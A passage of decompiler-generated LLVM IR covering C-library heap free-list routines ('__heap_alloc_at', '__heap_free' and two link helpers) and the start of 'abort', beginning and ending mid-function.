  %stack_var_-8 = alloca i32, align 4
  %v1_150d8 = inttoptr i32 %arg2 to i32*
  %v2_150d8 = load i32, i32* %v1_150d8, align 4
  %v3_150dc = load i32, i32* @r4, align 4
  store i32 %v3_150dc, i32* %stack_var_-8, align 4
  %v1_150e0 = add i32 %v2_150d8, 3
  %v1_150e4 = and i32 %v1_150e0, -4
  store i32 %v1_150e4, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_150ec = icmp ugt i32 %v1_150e4, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_150f4 = load i32, i32* %arg1, align 4
  store i32 %v2_150f4, i32* %r0.global-to-local, align 4
  br i1 %v2_150ec, label %dec_label_pc_15160.preheader, label %bb

bb:                                               ; preds = %entry
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15160.preheader

dec_label_pc_15160.preheader:                     ; preds = %entry, %bb
  %v1_15114 = phi i32 [ %v1_150e4, %entry ], [ 12, %bb ]
  %v2_151609 = icmp eq i32 %v2_150f4, 0
  br i1 %v2_151609, label %dec_label_pc_15168, label %dec_label_pc_15100

dec_label_pc_15100:                               ; preds = %dec_label_pc_15160.preheader, %dec_label_pc_1515c
  %v2_15118 = phi i32 [ %v3_1515c, %dec_label_pc_1515c ], [ %v2_150f4, %dec_label_pc_15160.preheader ]
  %v1_15100 = inttoptr i32 %v2_15118 to i32*
  %v2_15100 = load i32, i32* %v1_15100, align 4
  store i32 %v2_15100, i32* @ip, align 4
  %v3_15104 = icmp ult i32 %v2_15100, %v1_15114
  br i1 %v3_15104, label %dec_label_pc_1515c, label %dec_label_pc_1510c

dec_label_pc_1510c:                               ; preds = %dec_label_pc_15100
  %v1_1510c = add i32 %v1_15114, 44
  %v3_15110 = icmp ult i32 %v2_15100, %v1_1510c
  br i1 %v3_15110, label %dec_label_pc_15120, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_1510c
  %v2_15104.le = sub i32 %v2_15100, %v1_15114
  store i32 %v2_15104.le, i32* %v1_15100, align 4
  %v0_1514c.pre = load i32, i32* @ip, align 4
  %v0_15154.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_15120:                               ; preds = %dec_label_pc_1510c
  %v1_15120 = add i32 %v2_15118, 4
  %v2_15120 = inttoptr i32 %v1_15120 to i32*
  %v3_15120 = load i32, i32* %v2_15120, align 4
  store i32 %v3_15120, i32* %r2.global-to-local, align 4
  %v2_15124 = icmp eq i32 %v3_15120, 0
  br i1 %v2_15124, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_15120
  %v2_15128 = add i32 %v2_15118, 8
  %v3_15128 = inttoptr i32 %v2_15128 to i32*
  %v4_15128 = load i32, i32* %v3_15128, align 4
  %v3_1512c = add i32 %v3_15120, 8
  %v4_1512c = inttoptr i32 %v3_1512c to i32*
  store i32 %v4_15128, i32* %v4_1512c, align 4
  %v0_15130.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_15120, %bb27
  %v0_15130 = phi i32 [ %v2_15118, %dec_label_pc_15120 ], [ %v0_15130.pre, %bb27 ]
  %v1_15130 = add i32 %v0_15130, 8
  %v2_15130 = inttoptr i32 %v1_15130 to i32*
  %v3_15130 = load i32, i32* %v2_15130, align 4
  %v1_15134 = add i32 %v0_15130, 4
  %v2_15134 = inttoptr i32 %v1_15134 to i32*
  %v3_15134 = load i32, i32* %v2_15134, align 4
  %v2_15138 = icmp eq i32 %v3_15130, 0
  br i1 %v2_15138, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_1513c = add i32 %v3_15130, 4
  %v4_1513c = inttoptr i32 %v3_1513c to i32*
  store i32 %v3_15134, i32* %v4_1513c, align 4
  %v1_15144 = load i32, i32* @ip, align 4
  store i32 %v1_15144, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_15140 = load i32, i32* %r1.global-to-local, align 4
  %v3_15140 = inttoptr i32 %v2_15140 to i32*
  store i32 %v3_15134, i32* %v3_15140, align 4
  %v1_15148.pre = load i32, i32* @ip, align 4
  store i32 %v1_15148.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_15154 = phi i32 [ %v0_15154.pre, %.thread._crit_edge ], [ %v1_15144, %bb28 ], [ %v1_15148.pre, %.thread5 ]
  %v0_1514c = phi i32 [ %v0_1514c.pre, %.thread._crit_edge ], [ %v1_15144, %bb28 ], [ %v1_15148.pre, %.thread5 ]
  %v1_1514c = load i32, i32* %r0.global-to-local, align 4
  %v2_1514c = sub i32 %v1_1514c, %v0_1514c
  %v1_15150 = add i32 %v2_1514c, 12
  store i32 %v1_15150, i32* %r0.global-to-local, align 4
  %v1_15154 = load i32, i32* %r4.global-to-local, align 4
  %v2_15154 = inttoptr i32 %v1_15154 to i32*
  store i32 %v0_15154, i32* %v2_15154, align 4
  %v2_15158 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15158, i32* %r4.global-to-local, align 4
  ret i32 %v1_15150

dec_label_pc_1515c:                               ; preds = %dec_label_pc_15100
  %v1_1515c = add i32 %v2_15118, 4
  %v2_1515c = inttoptr i32 %v1_1515c to i32*
  %v3_1515c = load i32, i32* %v2_1515c, align 4
  store i32 %v3_1515c, i32* %r0.global-to-local, align 4
  %v2_15160 = icmp eq i32 %v3_1515c, 0
  br i1 %v2_15160, label %dec_label_pc_15160.dec_label_pc_15168_crit_edge, label %dec_label_pc_15100

dec_label_pc_15160.dec_label_pc_15168_crit_edge:  ; preds = %dec_label_pc_1515c
  br label %dec_label_pc_15168

dec_label_pc_15168:                               ; preds = %dec_label_pc_15160.dec_label_pc_15168_crit_edge, %dec_label_pc_15160.preheader
  store i32 %v3_150dc, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_1515c, { 1, 2, 0 }
  uselistorder i32 %v0_15130, { 1, 0 }
  uselistorder i32 %v2_15100, { 1, 0, 2, 3 }
  uselistorder i32 %v2_15118, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_15114, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_15100, { 1, 0 }
  uselistorder label %dec_label_pc_15160.preheader, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_15170 = load i32, i32* %arg1, align 4
  store i32 %v2_15170, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_151e86 = icmp eq i32 %v2_15170, 0
  br i1 %v2_151e86, label %dec_label_pc_151f0, label %dec_label_pc_1517c

dec_label_pc_1517c:                               ; preds = %entry, %dec_label_pc_151e4
  %v0_151bc = phi i32 [ %v3_151e4, %dec_label_pc_151e4 ], [ %v2_15170, %entry ]
  %v1_1517c = inttoptr i32 %v0_151bc to i32*
  %v2_1517c = load i32, i32* %v1_1517c, align 4
  store i32 %v2_1517c, i32* %r0.global-to-local, align 4
  %v2_15180 = sub i32 %v0_151bc, %v2_1517c
  %v1_15184 = add i32 %v2_15180, 12
  %v3_15188 = icmp uge i32 %v1_15184, %arg2
  %v9_15188 = icmp eq i32 %v1_15184, %arg2
  %v2_1518c = xor i1 %v9_15188, true
  %v3_1518c = and i1 %v3_15188, %v2_1518c
  br i1 %v3_1518c, label %dec_label_pc_151e4, label %dec_label_pc_15190

dec_label_pc_15190:                               ; preds = %dec_label_pc_1517c
  br i1 %v9_15188, label %dec_label_pc_15194, label %dec_label_pc_151f0

dec_label_pc_15194:                               ; preds = %dec_label_pc_15190
  %v1_15194 = add i32 %arg3, 3
  %v1_15198 = and i32 %v1_15194, -4
  store i32 %v1_15198, i32* %r2.global-to-local, align 4
  %v2_1519c = sub i32 %v2_1517c, %v1_15198
  %v3_1519c = icmp ult i32 %v2_1517c, %v1_15198
  br i1 %v3_1519c, label %dec_label_pc_151f0, label %dec_label_pc_151a4

dec_label_pc_151a4:                               ; preds = %dec_label_pc_15194
  %v1_151a4 = add i32 %v1_15198, 44
  %v3_151a8 = icmp ult i32 %v2_1517c, %v1_151a4
  br i1 %v3_151a8, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_151a4
  store i32 %v2_1519c, i32* %v1_1517c, align 4
  %v1_151b4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_151b4, i32* %r0.global-to-local, align 4
  ret i32 %v1_151b4

.thread2:                                         ; preds = %dec_label_pc_151a4
  %v1_151bc = add i32 %v0_151bc, 4
  %v2_151bc = inttoptr i32 %v1_151bc to i32*
  %v3_151bc = load i32, i32* %v2_151bc, align 4
  store i32 %v3_151bc, i32* %r2.global-to-local, align 4
  %v2_151c0 = icmp eq i32 %v3_151bc, 0
  br i1 %v2_151c0, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_151c4 = add i32 %v0_151bc, 8
  %v3_151c4 = inttoptr i32 %v2_151c4 to i32*
  %v4_151c4 = load i32, i32* %v3_151c4, align 4
  %v3_151c8 = add i32 %v3_151bc, 8
  %v4_151c8 = inttoptr i32 %v3_151c8 to i32*
  store i32 %v4_151c4, i32* %v4_151c8, align 4
  %v0_151cc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_151cc = phi i32 [ %v0_151bc, %.thread2 ], [ %v0_151cc.pre, %bb17 ]
  %v1_151cc = add i32 %v0_151cc, 8
  %v2_151cc = inttoptr i32 %v1_151cc to i32*
  %v3_151cc = load i32, i32* %v2_151cc, align 4
  store i32 %v3_151cc, i32* %r2.global-to-local, align 4
  %v1_151d0 = add i32 %v0_151cc, 4
  %v2_151d0 = inttoptr i32 %v1_151d0 to i32*
  %v3_151d0 = load i32, i32* %v2_151d0, align 4
  %v2_151d4 = icmp eq i32 %v3_151cc, 0
  br i1 %v2_151d4, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_151d8 = add i32 %v3_151cc, 4
  %v4_151d8 = inttoptr i32 %v3_151d8 to i32*
  store i32 %v3_151d0, i32* %v4_151d8, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_151dc = load i32, i32* %lr.global-to-local, align 4
  %v3_151dc = inttoptr i32 %v2_151dc to i32*
  store i32 %v3_151d0, i32* %v3_151dc, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_151e0 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_151e0

dec_label_pc_151e4:                               ; preds = %dec_label_pc_1517c
  %v1_151e4 = add i32 %v0_151bc, 4
  %v2_151e4 = inttoptr i32 %v1_151e4 to i32*
  %v3_151e4 = load i32, i32* %v2_151e4, align 4
  store i32 %v3_151e4, i32* %ip.global-to-local, align 4
  %v2_151e8 = icmp eq i32 %v3_151e4, 0
  br i1 %v2_151e8, label %dec_label_pc_151e8.dec_label_pc_151f0.loopexit_crit_edge, label %dec_label_pc_1517c

dec_label_pc_151e8.dec_label_pc_151f0.loopexit_crit_edge: ; preds = %dec_label_pc_151e4
  br label %dec_label_pc_151f0

dec_label_pc_151f0:                               ; preds = %dec_label_pc_15194, %entry, %dec_label_pc_151e8.dec_label_pc_151f0.loopexit_crit_edge, %dec_label_pc_15190
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_151e4, { 1, 2, 0 }
  uselistorder i32 %v0_151cc, { 1, 0 }
  uselistorder i32 %v1_15198, { 0, 2, 1, 3 }
  uselistorder i1 %v9_15188, { 1, 0 }
  uselistorder i32 %v2_1517c, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_151bc, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_151f0, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_1517c, { 1, 0 }
}

define i32 @__heap_link_free_area() local_unnamed_addr {
entry:
  %v0_151f8 = load i32, i32* @r2, align 4
  %v2_151f8 = icmp eq i32 %v0_151f8, 0
  %v0_151fc = load i32, i32* @r3, align 4
  %v1_151fc = load i32, i32* @r1, align 4
  %v2_151fc = add i32 %v1_151fc, 4
  %v3_151fc = inttoptr i32 %v2_151fc to i32*
  store i32 %v0_151fc, i32* %v3_151fc, align 4
  %v0_15200 = load i32, i32* @r2, align 4
  %v1_15200 = load i32, i32* @r1, align 4
  %v2_15200 = add i32 %v1_15200, 8
  %v3_15200 = inttoptr i32 %v2_15200 to i32*
  store i32 %v0_15200, i32* %v3_15200, align 4
  %v1_15208 = load i32, i32* @r1, align 4
  br i1 %v2_151f8, label %.thread, label %bb

bb:                                               ; preds = %entry
  %v2_15204 = load i32, i32* @r2, align 4
  %v3_15204 = add i32 %v2_15204, 4
  %v4_15204 = inttoptr i32 %v3_15204 to i32*
  store i32 %v1_15208, i32* %v4_15204, align 4
  br label %bb1

.thread:                                          ; preds = %entry
  %v2_15208 = load i32, i32* @r0, align 4
  %v3_15208 = inttoptr i32 %v2_15208 to i32*
  store i32 %v1_15208, i32* %v3_15208, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_1520c = load i32, i32* @r3, align 4
  %v2_1520c = icmp eq i32 %v0_1520c, 0
  br i1 %v2_1520c, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_15210 = load i32, i32* @r1, align 4
  %v3_15210 = add i32 %v0_1520c, 8
  %v4_15210 = inttoptr i32 %v3_15210 to i32*
  store i32 %v1_15210, i32* %v4_15210, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_15214 = load i32, i32* @r0, align 4
  ret i32 %v1_15214

; uselistorder directives
  uselistorder i32 %v1_15208, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @__heap_link_free_area_after() local_unnamed_addr {
entry:
  %v0_15218 = load i32, i32* @r2, align 4
  %v2_15218 = icmp eq i32 %v0_15218, 0
  %v1_1521c = load i32, i32* @r1, align 4
  br i1 %v2_15218, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1521c = load i32, i32* @r0, align 4
  %v3_1521c = inttoptr i32 %v2_1521c to i32*
  store i32 %v1_1521c, i32* %v3_1521c, align 4
  br label %bb2

.thread:                                          ; preds = %entry
  %v3_15220 = add i32 %v0_15218, 4
  %v4_15220 = inttoptr i32 %v3_15220 to i32*
  store i32 %v1_1521c, i32* %v4_15220, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_15224 = load i32, i32* @r2, align 4
  %v1_15224 = load i32, i32* @r1, align 4
  %v2_15224 = add i32 %v1_15224, 8
  %v3_15224 = inttoptr i32 %v2_15224 to i32*
  store i32 %v0_15224, i32* %v3_15224, align 4
  %v1_15228 = load i32, i32* @r0, align 4
  ret i32 %v1_15228

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__heap_free(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_1522c = load i32, i32* @r4, align 4
  store i32 %v3_1522c, i32* %stack_var_-20, align 4
  %v2_15230 = load i32, i32* %arg1, align 4
  store i32 %v2_15230, i32* %r4.global-to-local, align 4
  %v2_15234 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_152502 = icmp eq i32 %v2_15230, 0
  br i1 %v2_152502, label %dec_label_pc_15300, label %dec_label_pc_15240

dec_label_pc_15240:                               ; preds = %entry, %dec_label_pc_15248
  %v0_15290 = phi i32 [ %v0_15298, %dec_label_pc_15248 ], [ 0, %entry ]
  %v0_15298 = phi i32 [ %v3_1524c, %dec_label_pc_15248 ], [ %v2_15230, %entry ]
  %v1_152545.in = phi i32 [ %v3_1524c, %dec_label_pc_15248 ], [ %v2_15230, %entry ]
  %v1_152545 = add i32 %v1_152545.in, 12
  %v3_15240 = icmp ult i32 %v1_152545, %arg2
  br i1 %v3_15240, label %dec_label_pc_15248, label %dec_label_pc_15260

dec_label_pc_15248:                               ; preds = %dec_label_pc_15240
  store i32 %v0_15298, i32* %r6.global-to-local, align 4
  %v1_1524c = add i32 %v0_15298, 4
  %v2_1524c = inttoptr i32 %v1_1524c to i32*
  %v3_1524c = load i32, i32* %v2_1524c, align 4
  store i32 %v3_1524c, i32* %r4.global-to-local, align 4
  %v2_15250 = icmp eq i32 %v3_1524c, 0
  br i1 %v2_15250, label %dec_label_pc_15250.dec_label_pc_15300.loopexit_crit_edge, label %dec_label_pc_15240

dec_label_pc_15260:                               ; preds = %dec_label_pc_15240
  %v1_15260 = inttoptr i32 %v0_15298 to i32*
  %v2_15260 = load i32, i32* %v1_15260, align 4
  store i32 %v2_15260, i32* @ip, align 4
  %v2_15264 = sub i32 %v0_15298, %v2_15260
  %v1_15268 = add i32 %v2_15264, 12
  %v3_1526c = icmp uge i32 %v1_15268, %v2_15234
  %v9_1526c = icmp eq i32 %v1_15268, %v2_15234
  %v2_15270 = xor i1 %v9_1526c, true
  %v3_15270 = and i1 %v3_1526c, %v2_15270
  br i1 %v3_15270, label %dec_label_pc_15300, label %dec_label_pc_15274

dec_label_pc_15274:                               ; preds = %dec_label_pc_15260
  %v2_15274 = add i32 %v2_15260, %arg3
  store i32 %v2_15274, i32* %r7.global-to-local, align 4
  br i1 %v9_1526c, label %dec_label_pc_1527c, label %dec_label_pc_152a8

dec_label_pc_1527c:                               ; preds = %dec_label_pc_15274
  %v2_1527c = icmp eq i32 %v0_15290, 0
  br i1 %v2_1527c, label %dec_label_pc_152f4, label %dec_label_pc_15284

dec_label_pc_15284:                               ; preds = %dec_label_pc_1527c
  %v1_15284 = add i32 %v0_15290, 12
  %v9_15288 = icmp eq i32 %v1_15284, %arg2
  br i1 %v9_15288, label %dec_label_pc_15290, label %dec_label_pc_152f4

dec_label_pc_15290:                               ; preds = %dec_label_pc_15284
  %v1_15290 = inttoptr i32 %v0_15290 to i32*
  %v2_15290 = load i32, i32* %v1_15290, align 4
  %v1_15294 = add i32 %v0_15290, 8
  %v2_15294 = inttoptr i32 %v1_15294 to i32*
  %v3_15294 = load i32, i32* %v2_15294, align 4
  store i32 %v3_15294, i32* @r2, align 4
  store i32 %v0_15298, i32* @r1, align 4
  %v2_1529c = add i32 %v2_15290, %v2_15274
  store i32 %v2_1529c, i32* %r7.global-to-local, align 4
  %v0_152a0 = call i32 @__heap_link_free_area_after()
  br label %dec_label_pc_152f4

dec_label_pc_152a8:                               ; preds = %dec_label_pc_15274
  %v1_152a8 = add i32 %v0_15298, 4
  %v2_152a8 = inttoptr i32 %v1_152a8 to i32*
  %v3_152a8 = load i32, i32* %v2_152a8, align 4
  store i32 %v3_152a8, i32* %r5.global-to-local, align 4
  %v2_152ac = icmp eq i32 %v3_152a8, 0
  br i1 %v2_152ac, label %dec_label_pc_152e0, label %dec_label_pc_152b4

dec_label_pc_152b4:                               ; preds = %dec_label_pc_152a8
  %v1_152b4 = inttoptr i32 %v3_152a8 to i32*
  %v2_152b4 = load i32, i32* %v1_152b4, align 4
  store i32 %v2_152b4, i32* @ip, align 4
  %v2_152b8 = sub i32 %v3_152a8, %v2_152b4
  %v1_152bc = add i32 %v2_152b8, 12
  %v9_152c0 = icmp eq i32 %v2_15234, %v1_152bc
  br i1 %v9_152c0, label %dec_label_pc_152c8, label %dec_label_pc_152e0

dec_label_pc_152c8:                               ; preds = %dec_label_pc_152b4
  store i32 %v0_15290, i32* @r2, align 4
  store i32 %v3_152a8, i32* @r1, align 4
  %v2_152d0 = add i32 %v2_152b4, %v2_15274
  store i32 %v2_152d0, i32* %r7.global-to-local, align 4
  %v0_152d4 = call i32 @__heap_link_free_area_after()
  %v0_152d8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_152d8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_152f4

dec_label_pc_152e0:                               ; preds = %dec_label_pc_152b4, %dec_label_pc_152a8
  %v2_152e0 = add i32 %v0_15298, %arg3
  store i32 %v2_152e0, i32* %r4.global-to-local, align 4
  store i32 %v3_152a8, i32* @r3, align 4
  store i32 %v0_15290, i32* @r2, align 4
  store i32 %v2_152e0, i32* @r1, align 4
  %v0_152f0 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_152f4

dec_label_pc_152f4:                               ; preds = %dec_label_pc_15284, %dec_label_pc_1527c, %dec_label_pc_152c8, %dec_label_pc_15290, %dec_label_pc_152e0
  %v0_152f4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_152f4, i32* %r5.global-to-local, align 4
  %v0_152f8 = load i32, i32* %r7.global-to-local, align 4
  %v2_152f8 = inttoptr i32 %v0_152f4 to i32*
  store i32 %v0_152f8, i32* %v2_152f8, align 4
  br label %dec_label_pc_15318

dec_label_pc_15250.dec_label_pc_15300.loopexit_crit_edge: ; preds = %dec_label_pc_15248
  br label %dec_label_pc_15300

dec_label_pc_15300:                               ; preds = %entry, %dec_label_pc_15250.dec_label_pc_15300.loopexit_crit_edge, %dec_label_pc_15260
  %v1_15300 = add i32 %v2_15234, -12
  store i32 %v1_15300, i32* %r5.global-to-local, align 4
  %v3_15304 = inttoptr i32 %v1_15300 to i32*
  store i32 %arg3, i32* %v3_15304, align 4
  %v0_15308 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15308, i32* @r3, align 4
  %v0_1530c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1530c, i32* @r2, align 4
  %v0_15310 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_15310, i32* @r1, align 4
  %v0_15314 = call i32 @__heap_link_free_area()
  br label %dec_label_pc_15318

dec_label_pc_15318:                               ; preds = %dec_label_pc_152f4, %dec_label_pc_15300
  %v0_15318 = load i32, i32* %r5.global-to-local, align 4
  %v2_1531c = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_1531c, i32* @r4, align 4
  ret i32 %v0_15318

; uselistorder directives
  uselistorder i32 %v3_152a8, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_1526c, { 1, 0 }
  uselistorder i32 %v3_1524c, { 2, 3, 1, 0 }
  uselistorder i32 %v0_15298, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_15290, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @__heap_link_free_area, { 1, 0 }
  uselistorder i32 ()* @__heap_link_free_area_after, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_15318, { 1, 0 }
  uselistorder label %dec_label_pc_15300, { 1, 2, 0 }
  uselistorder label %dec_label_pc_152f4, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_15240, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
dec_label_pc_1533c.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_15320 = ptrtoint i32* %stack_var_-268 to i32
  %v1_15330 = call i32 @__pthread_return_0()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_1533c = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_1533c

dec_label_pc_1533c:                               ; preds = %dec_label_pc_1533c.lr.ph, %dec_label_pc_1533c
  %v1_15340 = phi i32 [ 31, %dec_label_pc_1533c.lr.ph ], [ %v1_1534c, %dec_label_pc_1533c ]
  %v4_15340 = mul i32 %v1_15340, 4
  %v5_15340 = add i32 %v4_15340, %v2_1533c
  %v2_15348 = add i32 %v5_15340, -128
  %v3_15348 = inttoptr i32 %v2_15348 to i32*
  store i32 0, i32* %v3_15348, align 4
  %v0_1534c = load i32, i32* %r1.global-to-local, align 4
  %v1_1534c = add i32 %v0_1534c, -1
  store i32 %v1_1534c, i32* %r1.global-to-local, align 4
  %v6_1534c = icmp slt i32 %v1_1534c, 0
  br i1 %v6_1534c, label %dec_label_pc_15354, label %dec_label_pc_1533c

dec_label_pc_15354:                               ; preds = %dec_label_pc_1533c
  %v2_15354 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_15354, i32* @r4, align 4
  store i32 %v2_15354, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_15360 = call i32 @__sigaddset()
  %v2_15364 = icmp eq i32 %v0_15360, 0
  br i1 %v2_15364, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_15354
  store i32 %v2_15354, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_15354, %bb
  store i32 86904, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_15364, i32 ptrtoint (i32* @global_var_120a8.1166 to i32))
  %v2_1537c = load i32, i32* @global_var_33838.1168, align 4
  %v2_15380 = icmp eq i32 %v2_1537c, 0
  br i1 %v2_15380, label %dec_label_pc_15388, label %dec_label_pc_153b8

dec_label_pc_15388:                               ; preds = %.thread1
  store i32 1, i32* @global_var_33838.1168, align 4
  br label %dec_label_pc_15390

dec_label_pc_15390:                               ; preds = %dec_label_pc_15408, %dec_label_pc_15388
  store i32 86944, i32* @lr, align 4
  %v1_1539c = call i32 @__pthread_return_0()
  %v1_153a4 = call i32 @__raise(i32 6)
  store i32 86968, i32* @lr, align 4
  %v1_153b4 = call i32 @__pthread_return_0()
  %v2_153bc.pre = load i32, i32* @global_var_33838.1168, align 4
  br label %dec_label_pc_153b8

dec_label_pc_153b8:                               ; preds = %.thread1, %dec_label_pc_15390
  %v0_1542c = phi i32 [ %v2_1537c, %.thread1 ], [ %v2_153bc.pre, %dec_label_pc_15390 ]
  store i32 ptrtoint (i32* @global_var_33838.1168 to i32), i32* %ip.global-to-local, align 4
  %v7_153c0 = icmp eq i32 %v0_1542c, 1
  br i1 %v7_153c0, label %dec_label_pc_153f0.lr.ph, label %dec_label_pc_15424

dec_label_pc_153f0.lr.ph:                         ; preds = %dec_label_pc_153b8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 140, i32* @r2, align 4
  store i32 2, i32* @global_var_33838.1168, align 4
  %v2_153dc = bitcast i32* %stack_var_-268 to i8*
  %v3_153dc = call i32 @__GI_memset(i8* %v2_153dc, i32 0)
  store i32 0, i32* %stack_var_-268, align 4
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_153f0

dec_label_pc_153f0:                               ; preds = %dec_label_pc_153f0.lr.ph, %dec_label_pc_153f0
  %v1_153f4 = phi i32 [ 31, %dec_label_pc_153f0.lr.ph ], [ %v1_15400, %dec_label_pc_153f0 ]
  %v4_153f4 = mul i32 %v1_153f4, 4
  %v5_153f4 = add i32 %v4_153f4, %v2_1533c
  %v2_153fc = add i32 %v5_153f4, -264
  %v3_153fc = inttoptr i32 %v2_153fc to i32*
  store i32 -1, i32* %v3_153fc, align 4
  %v0_15400 = load i32, i32* %r1.global-to-local, align 4
  %v1_15400 = add i32 %v0_15400, -1
  store i32 %v1_15400, i32* %r1.global-to-local, align 4
  %v6_15400 = icmp slt i32 %v1_15400, 0
  br i1 %v6_15400, label %dec_label_pc_15408, label %dec_label_pc_153f0

dec_label_pc_15408:                               ; preds = %dec_label_pc_153f0
  store i32 %v2_15320, i32* %r1.global-to-local, align 4
  %v4_1541c = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-268, i32 0)
  br label %dec_label_pc_15390

dec_label_pc_15424:                               ; preds = %dec_label_pc_153b8
  %v7_15424 = icmp eq i32 %v0_1542c, 2
  br i1 %v7_15424, label %dec_label_pc_1542c, label %dec_label_pc_15438

dec_label_pc_1542c:                               ; preds = %dec_label_pc_15424
  store i32 3, i32* @global_var_33838.1168, align 4
  %v0_15434 = call i32 @abort()
  %v2_15438.pre = load i32, i32* @global_var_33838.1168, align 4
  br label %dec_label_pc_15438

dec_label_pc_15438:                               ; preds = %dec_label_pc_15424, %dec_label_pc_1542c
  %v1_15440 = phi i32 [ %v0_1542c, %dec_label_pc_15424 ], [ %v2_15438.pre, %dec_label_pc_1542c ]
  %v7_1543c = icmp eq i32 %v1_15440, 3
  br i1 %v7_1543c, label %bb27, label %.thread3

